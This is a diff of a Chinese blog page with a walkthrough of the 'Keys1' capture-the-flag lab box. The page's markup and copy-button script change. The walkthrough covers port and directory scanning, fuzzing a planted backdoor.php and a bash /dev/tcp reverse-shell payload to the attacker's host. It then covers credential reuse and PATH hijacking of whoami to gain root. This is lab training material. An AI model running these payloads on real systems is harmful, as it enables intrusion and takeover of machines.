@@ -18,7 +18,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Keys1.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Keys1</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -42,7 +42,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -76,151 +86,133 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集与初步探测</h1>
 <p>起手还是老规矩，先扫出靶机的 IP 地址。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ sudo arp-scan -l     
 ...
 192.168.205.140 08:00:27:03:6d:aa       (Unknown)
-...
-</code></pre>
+...</pre></div>
 <p>确定目标 IP 为 192.168.205.140，接着跑一次全端口扫描看开了哪些服务。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ nmap -p 0-65535 192.168.205.140
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 23:43 -0500
 ...
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
-8080/tcp open  http-proxy
-</code></pre>
+8080/tcp open  http-proxy</pre></div>
 <p>开了 80 和 8080 两个 Web 端口。当时我先去访问了默认端口，顺手抓取一下页面源码。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ curl 192.168.205.140                                           
-&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body style=&quot;height:100vh;display:flex;justify-content:center;align-items:center;margin:0;&quot;&gt;&lt;h1&gt;Welcome to Maze-Sec&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
-&lt;!-- keys1.dsz --&gt;
-</code></pre>
-<p>页面里直接塞了个域名 <code>keys1.dsz</code>，显然是需要配 host 的。我直接把它写进 <code>/etc/hosts</code> 里，方便后续测试。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
-└─$ echo '192.168.205.140 keys1.dsz' | sudo tee -a /etc/hosts
-192.168.205.140 keys1.dsz
-</code></pre>
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html&gt;&lt;html&gt;&lt;body style=<span class="pl-s"><span class="pl-pds">"</span>height:100vh;display:flex;justify-content:center;align-items:center;margin:0;<span class="pl-pds">"</span></span>&gt;&lt;h<span class="pl-k">1&gt;</span>Welcome to Maze-Sec<span class="pl-k">&lt;</span>/h1&gt;&lt;/body&gt;&lt;/html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>-- keys1.dsz --<span class="pl-k">&gt;</span></pre></div>
+<p>页面里直接塞了个域名 <code class="notranslate">keys1.dsz</code>，显然是需要配 host 的。我直接把它写进 <code class="notranslate">/etc/hosts</code> 里，方便后续测试。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>192.168.205.140 keys1.dsz<span class="pl-pds">'</span></span> <span class="pl-k">|</span> sudo tee -a /etc/hosts
+192.168.205.140 keys1.dsz</pre></div>
 <p>当时我看了一眼 80 端口，发现是个 WordPress，但简单测了一下没找到什么现成的漏洞。8080 端口看起来是个没什么内容的欢迎页，于是我决定挂上字典爆破一下 8080 的目录。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://keys1.dsz:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64
 ...
 index.html           (Status: 200) [Size: 156]
-backdoor.php         (Status: 500) [Size: 0]
-</code></pre>
-<p>扫出了一个极度可疑的 <code>backdoor.php</code>，但返回了 500 错误。这说明文件存在，只是缺少正确运行的参数导致服务器报错。</p>
+backdoor.php         (Status: 500) [Size: 0]</pre></div>
+<p>扫出了一个极度可疑的 <code class="notranslate">backdoor.php</code>，但返回了 500 错误。这说明文件存在，只是缺少正确运行的参数导致服务器报错。</p>
 <h1>参数 Fuzz 与初始突破</h1>
 <p>既然是 backdoor，肯定要通过 GET 或 POST 传参执行命令。我直接用 ffuf 去 Fuzz 这个参数名。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
-└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u 'http://keys1.dsz:8080/backdoor.php?FUZZ=id' --fw 1
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u <span class="pl-s"><span class="pl-pds">'</span>http://keys1.dsz:8080/backdoor.php?FUZZ=id<span class="pl-pds">'</span></span> --fw 1
 ...
-0                       [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 220ms]
-</code></pre>
-<p>成功跑出了一个参数名为 <code>0</code>。立刻用 curl 验证一下是否能执行 <code>id</code> 命令。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
-└─$ curl 'http://keys1.dsz:8080/backdoor.php?0=id'
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre>
+0                       [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 220ms]</pre></div>
+<p>成功跑出了一个参数名为 <code class="notranslate">0</code>。立刻用 curl 验证一下是否能执行 <code class="notranslate">id</code> 命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://keys1.dsz:8080/backdoor.php?0=id<span class="pl-pds">'</span></span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
 <p>命令执行确认无误。接着构造反弹 Shell 的 payload，把 shell 弹到我本地的 8888 端口。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
-└─$ curl &quot;http://keys1.dsz:8080/backdoor.php?0=bash+-c+'bash+-i+&gt;%26+/dev/tcp/192.168.205.128/8888+0&gt;%261'&quot;
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ curl <span class="pl-s"><span class="pl-pds">"</span>http://keys1.dsz:8080/backdoor.php?0=bash+-c+'bash+-i+&gt;%26+/dev/tcp/192.168.205.128/8888+0&gt;%261'<span class="pl-pds">"</span></span></pre></div>
 <p>Kali 这边成功接到了弹回来的 shell。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 46580
-bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: cannot <span class="pl-c1">set</span> terminal process group (1): Inappropriate ioctl <span class="pl-k">for</span> device
 ...
-www-data@292178caf8f3:/var/www/html$ echo $0
-echo $0
-bash
-</code></pre>
+www-data@292178caf8f3:/var/www/html$ <span class="pl-c1">echo</span> <span class="pl-smi">$0</span>
+<span class="pl-c1">echo</span> <span class="pl-smi">$0</span>
+bash</pre></div>
 <p>为了操作方便，我顺手把 shell 升级成了交互式 tty。</p>
-<pre lang="bash"><code>script /dev/null -c bash
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash
 Ctrl+Z
-stty raw -echo; fg
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
 reset xterm
-export TERM=xterm
-export SHELL=/bin/bash
-stty rows 36 columns 178
-</code></pre>
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 36 columns 178</pre></div>
 <h1>踩坑：虚假的 Root 权限</h1>
-<p>在当前目录下随便翻了翻，本能地打个 <code>env</code> 看一下环境变量，结果有大发现。</p>
-<pre lang="bash"><code>www-data@292178caf8f3:/home$ env
+<p>在当前目录下随便翻了翻，本能地打个 <code class="notranslate">env</code> 看一下环境变量，结果有大发现。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@292178caf8f3:/home$ env
 ...
 ROOT_PASSWORD=root123.
 HOSTNAME=292178caf8f3
-...
-</code></pre>
-<p>环境变量里居然直接写着 <code>ROOT_PASSWORD=root123.</code>。我立刻用这个密码切到了 root。</p>
-<pre lang="bash"><code>www-data@292178caf8f3:/home$ su -
+...</pre></div>
+<p>环境变量里居然直接写着 <code class="notranslate">ROOT_PASSWORD=root123.</code>。我立刻用这个密码切到了 root。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@292178caf8f3:/home$ su -
 Password: 
-root@292178caf8f3:~#  id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
+root@292178caf8f3:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span>  id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
 <p>切过去后发现高兴得太早了，环境极其干净，什么都没有。结合前面的 HOSTNAME 和现在的状况，反应过来刚才打下的是个 Docker 容器，这里拿到的只是容器内的 root，对主线毫无帮助。</p>
 <h1>柳暗花明：重回 WordPress</h1>
-<p>虽然容器是条死胡同，但那个 <code>root123.</code> 的密码可能别有用途。我回想起刚开始看 80 端口的 WordPress 时，发现过一个叫 <code>todd</code> 的作者用户名。</p>
-<p>死马当活马医，去 <code>http://keys1.dsz/wordpress/wp-login.php</code> 试了一下 <code>todd</code> 和密码 <code>root123.</code>，居然直接进后台了。
+<p>虽然容器是条死胡同，但那个 <code class="notranslate">root123.</code> 的密码可能别有用途。我回想起刚开始看 80 端口的 WordPress 时，发现过一个叫 <code class="notranslate">todd</code> 的作者用户名。</p>
+<p>死马当活马医，去 <code class="notranslate">http://keys1.dsz/wordpress/wp-login.php</code> 试了一下 <code class="notranslate">todd</code> 和密码 <code class="notranslate">root123.</code>，居然直接进后台了。<br>
 有了 WP 后台权限，接下来就是轻车熟路打插件拿 Shell。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 45172
 id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
 <p>这次打进来的这台机器才是真正的宿主机。还是老套路，先稳定 shell。</p>
-<pre lang="bash"><code>script /dev/null -c bash
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash
 Ctrl+Z
-stty raw -echo; fg
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
 reset xterm
-export TERM=xterm
-export SHELL=/bin/bash
-stty rows 36 columns 178
-</code></pre>
-<p>退到 <code>/home</code> 目录看了一眼，用户多得离谱。</p>
-<pre lang="bash"><code>www-data@Key1:/home$ ls -al
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 36 columns 178</pre></div>
+<p>退到 <code class="notranslate">/home</code> 目录看了一眼，用户多得离谱。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Key1:/home$ ls -al
 total 56
-drwxr-xr-x 14 root     root     4096 Feb 15 02:24 .
+drwxr-xr-x 14 root     root     4096 Feb 15 02:24 <span class="pl-c1">.</span>
 ...
 drwx------  2 bot      bot      4096 Feb 26 00:43 bot
 drwx------  2 byxs     byxs     4096 Feb 26 00:43 byxs
 ...
 drwxr-xr-x  2 sublarge sublarge 4096 Feb 26 00:43 sublarge
-...
-</code></pre>
+...</pre></div>
 <p>在这里磨蹭了半天，本以为会有什么弱密码之类的设计，结果全是无用功。</p>
 <h1>权限提升：环境变量劫持</h1>
-<p>在系统里四处翻找可疑文件时，我注意到了一个奇怪的自定义二进制文件 <code>/usr/local/bin/key1</code>。</p>
-<pre lang="bash"><code>www-data@Key1:/tmp$ /usr/local/bin/key1
+<p>在系统里四处翻找可疑文件时，我注意到了一个奇怪的自定义二进制文件 <code class="notranslate">/usr/local/bin/key1</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Key1:/tmp$ /usr/local/bin/key1
 Current user: www-data
 Now is user cyl turn
 www-data@Key1:/tmp$ ls -al /usr/local/bin/key1
--rwx--x--x 1 root root 17464 Feb 15 07:15 /usr/local/bin/key1
-</code></pre>
-<p>看输出，它打印了 <code>Current user: www-data</code>。我顺手看了下它的帮助文档。</p>
-<pre lang="bash"><code>www-data@Key1:/tmp$ /usr/local/bin/key1 -h
+-rwx--x--x 1 root root 17464 Feb 15 07:15 /usr/local/bin/key1</pre></div>
+<p>看输出，它打印了 <code class="notranslate">Current user: www-data</code>。我顺手看了下它的帮助文档。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Key1:/tmp$ /usr/local/bin/key1 -h
 Options:
-  -h, --help              Display this help message and exit
+  -h, --help              Display this <span class="pl-c1">help</span> message and <span class="pl-c1">exit</span>
   -p, --password PASSWORD Output root password format with provided password
 Standard logic:
   1. Reads users from /opt/user.txt
-  2. Compares current user with a selected user
-</code></pre>
-<p>这里它的逻辑是判断当前用户是否和某个选中的用户一致。既然它能输出 <code>Current user: www-data</code>，很大概率是在底层调用了系统的 <code>whoami</code> 命令，而且没有用绝对路径。这就是经典的 PATH 环境变量劫持场景。</p>
-<p>我直接在 <code>/tmp</code> 下写一个假的 <code>whoami</code> 脚本，让它输出我们想要伪造的用户名 <code>sublarge</code>，然后把 <code>/tmp</code> 塞到环境变量的最前面。</p>
-<pre lang="bash"><code>www-data@Key1:/tmp$ echo 'echo -n &quot;sublarge&quot;' &gt; whoami
+  2. Compares current user with a selected user</pre></div>
+<p>这里它的逻辑是判断当前用户是否和某个选中的用户一致。既然它能输出 <code class="notranslate">Current user: www-data</code>，很大概率是在底层调用了系统的 <code class="notranslate">whoami</code> 命令，而且没有用绝对路径。这就是经典的 PATH 环境变量劫持场景。</p>
+<p>我直接在 <code class="notranslate">/tmp</code> 下写一个假的 <code class="notranslate">whoami</code> 脚本，让它输出我们想要伪造的用户名 <code class="notranslate">sublarge</code>，然后把 <code class="notranslate">/tmp</code> 塞到环境变量的最前面。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Key1:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>echo -n "sublarge"<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> whoami
 www-data@Key1:/tmp$ chmod +x whoami
-www-data@Key1:/tmp$ export PATH=/tmp:$PATH
+www-data@Key1:/tmp$ <span class="pl-k">export</span> PATH=/tmp:<span class="pl-smi">$PATH</span>
 www-data@Key1:/tmp$ cat whoami
-echo -n &quot;sublarge&quot;
-</code></pre>
-<p>环境配好后，疯狂运行这个 <code>key1</code> 程序。可以看到它每运行一次，就会轮换一个目标用户。</p>
-<pre lang="bash"><code>www-data@Key1:/tmp$ /usr/local/bin/key1
+<span class="pl-c1">echo</span> -n <span class="pl-s"><span class="pl-pds">"</span>sublarge<span class="pl-pds">"</span></span></pre></div>
+<p>环境配好后，疯狂运行这个 <code class="notranslate">key1</code> 程序。可以看到它每运行一次，就会轮换一个目标用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Key1:/tmp$ /usr/local/bin/key1
 Current user: sublarge
 Now is user xnz turn
 ...
@@ -231,28 +223,24 @@ www-data@Key1:/tmp$ /usr/local/bin/key1
 Current user: sublarge
 Now is user da turn
 www-data@Key1:/tmp$ /usr/local/bin/key1
-sublarge: 9cesSxZfHJS8DNxieFUx
-</code></pre>
-<p>在反复执行几次后，程序终于匹配上了我们伪造的身份，吐出了 <code>sublarge</code> 用户的密码。</p>
+sublarge: 9cesSxZfHJS8DNxieFUx</pre></div>
+<p>在反复执行几次后，程序终于匹配上了我们伪造的身份，吐出了 <code class="notranslate">sublarge</code> 用户的密码。</p>
 <h1>最终接管验证</h1>
-<p>拿到了有效密码，剩下的流程就毫无悬念了。先切到 <code>sublarge</code>，然后再根据前面 <code>key1 -h</code> 提示的功能，获取 root 的密码。</p>
-<pre lang="bash"><code>www-data@Key1:/tmp$ su sublarge
+<p>拿到了有效密码，剩下的流程就毫无悬念了。先切到 <code class="notranslate">sublarge</code>，然后再根据前面 <code class="notranslate">key1 -h</code> 提示的功能，获取 root 的密码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Key1:/tmp$ su sublarge
 Password: 
 sublarge@Key1:/tmp$ id
 uid=1003(sublarge) gid=1003(sublarge) groups=1003(sublarge)
 sublarge@Key1:/tmp$ /usr/local/bin/key1 -p 9cesSxZfHJS8DNxieFUx
-root: mc6gMij9hFetO6S0WNrd 
-</code></pre>
+root: mc6gMij9hFetO6S0WNrd </pre></div>
 <p>直接拿着吐出来的 root 密码切换身份，双 flag 到手。</p>
-<pre lang="bash"><code>sublarge@Key1:/tmp$ su -
+<div class="highlight highlight-source-shell"><pre class="notranslate">sublarge@Key1:/tmp$ su -
 Password: 
-root@Key1:~#  id
+root@Key1:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span>  id</span>
 uid=0(root) gid=0(root) groups=0(root)
-root@Key1:~#  cat /root/root.txt /home/sublarge/user.txt 
+root@Key1:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span>  cat /root/root.txt /home/sublarge/user.txt </span>
 flag{root-2d8e0ca998ebd0a3abdee36468170c99}
-flag{user-163aafb4875076a94dcf6a701d3d06bc}
-</code></pre>
-</div>
+flag{user-163aafb4875076a94dcf6a701d3d06bc}</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -277,7 +265,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -324,7 +312,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
